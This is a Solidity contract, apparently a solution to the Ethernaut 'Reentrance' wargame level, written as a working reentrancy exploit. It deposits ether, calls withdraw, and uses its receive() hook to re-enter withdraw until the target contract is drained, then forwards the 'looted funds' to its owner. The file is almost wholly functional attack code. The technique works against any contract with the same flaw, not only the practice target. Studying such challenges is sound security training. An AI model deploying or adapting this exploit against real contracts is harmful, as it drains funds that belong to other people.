//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceExploit {
    IReentrance public implementation;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Reentrance` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb
    constructor(IReentrance _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Function initiates exploit by depositing and witdrawing from `Reentrance` contract
    function exploit() external payable onlyOwner {
        require(msg.value >= 1 ether);

        implementation.donate{value: msg.value}(address(this));

        implementation.withdraw(implementation.balanceOf(address(this)));
    }

    /// @notice Function for owner to withdraw looted funds
    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "call failed");
    }

    /// @notice Returns a boolean wheter the `implementation` contract has been drained
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = address(implementation).balance == 0;
    }

    /// @notice Keeps calling `withdraw()` function if `Reentrance` contract still has ether in it
    receive() external payable {
        if (
            msg.sender == address(implementation) &&
            address(implementation).balance > 0
        ) {
            uint256 nextLoot = address(implementation).balance > msg.value
                ? msg.value
                : address(implementation).balance;

            implementation.withdraw(nextLoot);
        }
    }
}
